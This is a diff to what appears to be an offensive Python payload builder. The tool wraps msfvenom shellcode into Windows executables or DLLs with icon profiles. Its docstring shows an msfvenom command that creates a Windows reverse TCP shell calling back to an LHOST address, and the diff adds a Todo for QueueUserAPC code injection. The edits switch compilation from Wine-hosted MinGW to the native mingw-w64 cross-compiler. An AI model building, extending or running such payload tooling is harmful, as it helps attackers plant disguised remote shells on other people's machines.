@@ -11,7 +11,10 @@ $ msfvenom -p windows/shell_reverse_tcp -f raw -b '\\x00\\xff' LHOST=192.168.56.
 
 Refs:
 - https://msdn.microsoft.com/en-us/library/aa381043(v=vs.85).aspx
+- MinGW-W64 (apt-get install mingw-w64 first)
 
+Todo:
+- add QueueUserAPC code injection technique
 """
 
 import sys
@@ -367,8 +370,6 @@ if __name__ == "__main__":
     parser.add_argument("--dll", default=False, action="store_true", help="Generate a DLL")
     parser.add_argument("--exe", default=False, action="store_true", help="Generate a PE Console")
     parser.add_argument("--win32", default=True, action="store_true", help="Generate a PE GUI (default)")
-
-    parser.add_argument("--gcc-path", default=HOME + "/.wine/drive_c/MinGW/bin", dest="bin", help="Specify path to MinGW GCC binary directory")
     parser.add_argument("--icons-path", default="./icons/", dest="ico", help="Specify path to icons/ directory")
     parser.add_argument("--no-compile", default=False, dest="no_compile", action="store_true", help="If set, only the C file will be generated.")
 
@@ -425,7 +426,8 @@ if __name__ == "__main__":
             print("[+] Using profile %s" % args.profile.title())
             resfile = create_resource_file( args.profile )
             res_o = "/tmp/res.o"
-            cmd = "cd {} && wine ./windres.exe {} -O coff -o {}".format(args.bin, resfile, res_o)
+            cmd = "i686-w64-mingw32-windres {} -O coff -o {}".format(resfile, res_o)
+
         if not args.quiet:
             print("[+] Generating resources '{}'->'{}'".format(resfile, res_o))
             ret = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,)
@@ -447,11 +449,11 @@ if __name__ == "__main__":
         ename = args.output
 
     if args.dll:
-        cmd = "cd {0} && wine ./gcc.exe {1} -shared -o {2}  -Wl,--out-implib,{2}.a".format(args.bin, cname, ename)
+        cmd = "i686-w64-mingw32-gcc {0} -shared -o {1}  -Wl,--out-implib,{1}.a".format(cname, ename)
     elif args.exe:
-        cmd = "cd {} && wine ./gcc.exe {} {} -o {}".format(args.bin, cname, res_o, ename)
+        cmd = "i686-w64-mingw32-gcc {} {} -o {}".format(cname, res_o, ename)
     else:
-        cmd = "cd {} && wine ./gcc.exe -D_UNICODE -DUNICODE -DWIN32 -D_WINDOWS -mwindows {} {} -o {}".format(args.bin, cname, res_o, ename)
+        cmd = "i686-w64-mingw32-gcc -D_UNICODE -DUNICODE -DWIN32 -D_WINDOWS -mwindows {} {} -o {}".format(cname, res_o, ename)
 
     if not args.quiet:
         print("[+] Compiling '{}'->'{}'".format(cname, ename))
